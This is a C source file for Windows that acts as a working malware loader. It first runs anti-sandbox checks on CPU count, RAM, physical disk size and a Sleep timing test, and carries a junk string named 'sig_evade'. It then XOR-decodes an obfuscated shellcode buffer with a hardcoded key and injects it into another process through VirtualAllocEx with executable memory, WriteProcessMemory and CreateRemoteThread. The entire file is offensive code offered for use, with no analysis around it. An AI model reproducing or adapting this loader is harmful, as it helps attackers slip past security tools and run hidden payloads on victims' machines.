
#include <windows.h>
#include <stdio.h>
#include <time.h>

unsigned long get_time()
{
	return (unsigned long)time(NULL);
}
void compute_ftp()
{
	return;
}
int main(void)
{
	const char sig_evade[] = "cxdrmrjebwyihavcmwxhyehrzchdpnsc";
	// check CPU
	SYSTEM_INFO systemInfo;
	GetSystemInfo(&systemInfo);
	DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
	printf("Processors: %d\n", numberOfProcessors);
	if (numberOfProcessors < 2) {
		compute_ftp();
		return 0;
	}
		

	// check RAM
	MEMORYSTATUSEX memoryStatus;
	memoryStatus.dwLength = sizeof(memoryStatus);
	GlobalMemoryStatusEx(&memoryStatus);
	DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
	printf("Memory: %d\n", RAMMB);
	if (RAMMB < 2048) {
		compute_ftp();
		return 0;
	}

	// check HDD
	HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	DISK_GEOMETRY pDiskGeometry;
	DWORD bytesReturned;
	DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
	DWORD diskSizeGB;
	diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
	printf("Disk space: %d\n", diskSizeGB);
	if (diskSizeGB < 70) {
		compute_ftp();
		return 0;
	}

	unsigned long start = get_time();
	Sleep(2000);
	unsigned long end = get_time();
	printf("Diff: %d\n", end-start);
	if ((end - start) != 2)
	{
		compute_ftp();
		return 0;
	}

	if ((end - start) == 2)
	{
		char buf[] = "\x84\x3d\xe5\x92\x93\x8d\xa9\x7a\x65\x61\x3b\x29\x37\x21\x38\x22\x49\xa7\x3\x3e\xe8\x37\x5\x32\xee\x33\x62\x30\xfd\x23\x4a\x3b\x2e\x3d\xed\x4\x33\x2d\x6a\xcd\x2f\x2b\x37\x49\xbf\x39\x5b\xaa\xd4\x49\x7\xa\x61\x49\x45\x3b\xa4\xa8\x77\x39\x77\xb0\x88\x87\x2a\x34\x37\x3e\xe8\x37\x45\xf1\x27\x5d\x32\x79\xa6\x17\xeb\x12\x60\x7e\x64\x79\xe6\x17\x65\x7a\x65\xea\xfa\xf0\x76\x71\x6a\x22\xfd\xb5\x12\x11\x2b\x64\xb5\xf1\x2d\x79\x2a\x3c\xfd\x31\x4a\x23\x79\xa5\x85\x20\x2e\x54\xac\x32\x9a\xa8\x3b\xf3\x42\xf9\x22\x6b\xae\x3d\x57\xb6\xcf\x24\xa4\xb3\x68\x20\x7b\xb9\x4e\x91\x1f\x9b\x34\x76\x2a\x52\x6b\x20\x5c\xab\x10\xb9\x22\x3c\xfd\x31\x4e\x23\x79\xa5\x0\x37\xe8\x69\x2d\x3e\xee\x21\x66\x31\x77\xa1\x2b\xe1\x7c\xfd\x27\x2e\x2b\x64\xb5\x3b\x3d\x3f\x23\x22\x37\x29\x2b\x33\x39\x2f\x2e\xf5\x8f\x45\x24\x28\x9a\x81\x22\x39\x2f\x2b\x22\xe1\x6a\x9c\x2d\x89\x9c\x9a\x38\x32\x54\xba\x29\x31\xc8\x6\x3\x4\x11\x1b\x3\x2\x63\x24\x33\x32\xec\x80\x33\xbf\xb4\x3d\x1d\x4c\x7f\x8a\xb3\x25\x30\x2d\xec\x9b\x36\x3b\x37\x49\xb6\x3c\x5b\xa3\x2b\x26\x2f\xcc\x59\x33\x1c\xdd\x65\x61\x7a\x78\x89\xa4\x82\x64\x78\x75\x66\x47\x5a\x57\x4b\x4b\x53\x59\x54\x49\x58\x43\x58\x5e\x78\x2f\x2e\xff\xa2\x2c\xa2\xba\xde\x60\x7a\x78\x3b\x40\xa3\x39\x2b\x1f\x65\x25\x2a\xdf\x32\xf3\xfa\xa7\x7a\x78\x76\x71\x95\xbf\x90\xa2\x66\x76\x63\x4a\x23\x35\x22\x24\x17\x21\x27\x25\x3f\x53\x1b\x18\x22\x25\x0\x35\x37\x2f\x3f\x10\x3d\x39\x11\x5\x52\x3f\x1\x41\x14\x46\x30\x55\x24\x19\x1d\x34\x28\x12\x6\x26\x29\x30\x30\x32\x57\x15\x30\x2\x22\x18\x1d\x34\x28\x2f\x29\x32\x1b\x1e\x37\x10\x2\x1\x11\x10\x12\x14\xf\x2\x4f\x33\x44\x26\x3c\x3c\x9\x3a\x11\x7\x31\x1f\x27\xd\x5c\x35\x1c\x2f\x27\x46\x26\x2\x3e\x34\x1f\x33\x31\xe\x3a\x34\x15\x34\x22\xa\x5b\x37\x2\x2c\x3c\x30\x28\x23\x2d\x1\x15\x13\x29\x13\x4a\x14\x41\x18\x39\x58\x1\x3\x17\x1d\x1\x2d\x5c\x1e\x5d\x56\x2c\x1f\x5\x1\xd\x5\x1\x23\x1f\x10\x2\x3d\x29\x1b\x11\x59\x4f\x40\x3d\x33\x1c\x53\x1a\x21\x33\x33\x3c\x34\x33\x4d\x36\x56\x42\x28\x24\x43\x2b\x22\x3f\x4d\x24\x29\x5\x12\x2\x11\x35\x3b\x49\x4b\x31\x24\x29\x3e\xa\x43\x1\xc\x17\x3c\x15\x32\x11\x3e\x29\x4f\x17\x3\x2f\x1b\x2f\x3\x50\x2\x3a\x54\xf\x4e\xf\x2d\x2e\x78\x3e\xf8\xab\x39\x22\x34\x3e\x3b\x52\xac\x36\x32\xdd\x61\x48\xd0\xf2\x71\x6a\x6a\x78\x25\x35\x25\x2a\xa2\xa7\x91\x30\x4f\x41\x87\xa3\x39\xe3\xac\x12\x7f\x39\x3e\xea\x94\xf\x65\x3f\x33\x12\xf8\x45\x71\x6a\x23\xf1\x95\xc\x72\x22\x3c\x2c\xc0\x10\x27\xe4\xfe\x76\x71\x6a\x6a\x87\xa0\x2b\x47\xa3\x36\x3f\x32\xec\x90\x37\x49\xbf\x3c\x5b\xa3\x2b\x26\x2f\xb1\xa1\x48\x63\x62\x1e\x9e\xaf\xfd\xb6\x4\x75\x22\xbf\xb4\xee\x65\x63\x65\x2c\xc0\x21\x91\x4f\x98\x76\x71\x6a\x6a\x87\xa0\x2e\x89\xac\x11\x67\x91\xcf\x89\x2f\x78\x76\x71\x39\x33\x12\x35\x3c\x3f\xea\xb4\xa4\x98\x75\x28\xbd\xb8\x76\x61\x6a\x6a\x31\xcf\x3e\xd2\x30\x80\x65\x7a\x65\x61\x85\xad\x3e\xe2\x39\x39\x30\xfc\x81\x3e\xea\x94\x2d\xf3\xbf\x28\xbd\xb8\x76\x51\x6a\x6a\x31\xfc\x9f\x3f\xd9\x77\xf3\xf3\x87\x61\x7a\x78\x76\x8e\xbf\x22\xfb\xb1\x46\xf3\xa3\x11\xd7\x1c\xee\x66\x32\x79\xb5\xf4\xaa\x1f\xaa\x2d\xa5\x2e\x9\x65\x3c\x33\xa2\xa3\x8a\xcd\xd4\x27\x95\xbf";
		const char key[] = "xufvceezeazxvqjj";

			for (int i = 0; i < sizeof(buf); i++)
		{
			buf[i] = buf[i] ^ key[i % (sizeof(key) - 1)];
		}
		int migrateToPID = 12836;
		HANDLE hProcess = OpenProcess(0x001F0FFF, 0, migrateToPID);
		int i = 0;
		HANDLE addr = VirtualAllocEx(hProcess, &i, 0x1000, 0x3000, 0x40);

		size_t outSize;
		size_t j = 0;
		WriteProcessMemory(hProcess, addr, buf, sizeof buf, &outSize);
		int *threadId = CreateRemoteThread(hProcess, 0, 0, addr, &i,  0, 0);
	}
	return 0;
}